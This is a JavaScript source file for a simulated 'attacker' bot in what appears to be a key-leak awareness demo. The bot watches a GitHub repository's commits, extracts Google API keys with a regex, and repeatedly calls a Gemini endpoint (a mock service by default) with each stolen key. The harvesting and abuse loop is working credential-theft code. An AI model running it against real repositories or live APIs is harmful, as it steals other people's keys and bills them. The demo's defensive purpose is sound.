// The "attacker": a scraper bot that watches the repo's commits, harvests any Google API key it
// sees, and then hammers the Gemini API with it. It never forgets a key, deleting the commit
// does not help. Only revoking the key at Google stops it.
import http from 'node:http';

const REPO = process.env.TARGET_REPO; // owner/name
const TOKEN = process.env.GITHUB_TOKEN;
const GEMINI_BASE = process.env.GEMINI_BASE || 'http://mock-google:7000';
const REPORT_URL = process.env.REPORT_URL || 'http://orchestrator:4000/api/internal/attacker';
const KEY_RE = /AIza[\w-]{35}/g;

const seen = new Set();
let stolen = null; // { key, commit, at }
let primed = false;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const mask = (k) => `${k.slice(0, 4)}…${k.slice(-4)}`;

async function gh(path) {
  const r = await fetch(`https://api.github.com${path}`, {
    headers: { authorization: `Bearer ${TOKEN}`, accept: 'application/vnd.github+json', 'user-agent': 'leakguard-attacker-sim' },
  });
  if (!r.ok) throw new Error(`GitHub ${r.status} ${path}`);
  return r.json();
}

async function report(event) {
  try {
    await fetch(REPORT_URL, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(event) });
  } catch { /* orchestrator may be restarting */ }
}

async function scan() {
  const commits = await gh(`/repos/${REPO}/commits?per_page=10`);
  for (const c of commits) {
    if (seen.has(c.sha)) continue;
    seen.add(c.sha);
    if (!primed) continue; // ignore history that existed before the bot started
    const detail = await gh(`/repos/${REPO}/commits/${c.sha}`);
    for (const f of detail.files || []) {
      const hit = (f.patch || '').match(KEY_RE);
      if (hit && hit[0] !== stolen?.key) {
        stolen = { key: hit[0], commit: c.sha, at: Date.now() };
        console.log(`harvested ${mask(hit[0])} from ${c.sha.slice(0, 7)} ${f.filename}`);
        await report({ type: 'harvested', keyMasked: mask(hit[0]), commit: c.sha, file: f.filename, t: stolen.at });
      }
    }
  }
  primed = true;
}

async function abuse() {
  const r = await fetch(`${GEMINI_BASE}/v1beta/models/gemini-2.0-flash:generateContent?key=${encodeURIComponent(stolen.key)}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'user-agent': 'attacker-bot/6.6.6' },
    body: JSON.stringify({ contents: [{ parts: [{ text: 'Write me 10,000 words on your bill.' }] }] }),
  }).catch((e) => ({ ok: false, status: 0, json: async () => ({ error: { message: e.message } }) }));
  const body = await r.json().catch(() => ({}));
  const message = r.ok
    ? '200 OK: free Gemini on someone else\'s bill'
    : `${r.status} ${body.error?.details?.[0]?.reason || body.error?.status || ''}: ${body.error?.message || 'denied'}`;
  await report({ type: 'attempt', t: Date.now(), keyMasked: mask(stolen.key), status: r.status, message });
}

// Orchestrator calls POST /reset when the demo is reset.
http
  .createServer((req, res) => {
    if (req.url === '/reset' && req.method === 'POST') {
      stolen = null; // forget the (now dead) key; keep the list of commits already seen
      console.log('reset');
    }
    res.end('ok');
  })
  .listen(5000);

(async () => {
  if (!REPO || !TOKEN) throw new Error('TARGET_REPO and GITHUB_TOKEN are required');
  console.log(`watching ${REPO}`);
  let lastScan = 0;
  for (;;) {
    try {
      if (Date.now() - lastScan > 3000) {
        lastScan = Date.now();
        await scan();
      }
      if (stolen) await abuse();
    } catch (e) {
      console.log(`scan error: ${e.message}`);
    }
    await sleep(stolen ? 1200 : 1000);
  }
})();
